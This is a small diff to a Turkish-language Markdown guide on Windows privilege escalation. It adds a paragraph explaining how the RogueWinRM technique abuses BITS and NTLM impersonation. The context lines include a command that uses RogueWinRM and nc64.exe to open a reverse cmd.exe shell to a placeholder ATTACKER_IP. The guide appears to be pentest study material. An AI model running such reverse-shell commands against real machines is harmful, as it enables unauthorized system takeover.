@@ -413,6 +413,8 @@ Sonra hedef makinede aşağıdaki gibi bir komut çalıştırırız
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 ```
 
+Buradan sonra BITS servisi, RogueWinRM'in açtığı sahte WinRM servisine bağlanır. Bu servis SSPI/NTLM oturumunu kabul edip `AcceptSecurityContext` aracılığıyla server tarafında bir security context oluşturur. Sonra da `ImpersonateSecurityContext` ile o context üzerinden impersonation yapar. 
+
 ## Kullanılabilecek Toollar
 
 - WinPEAS
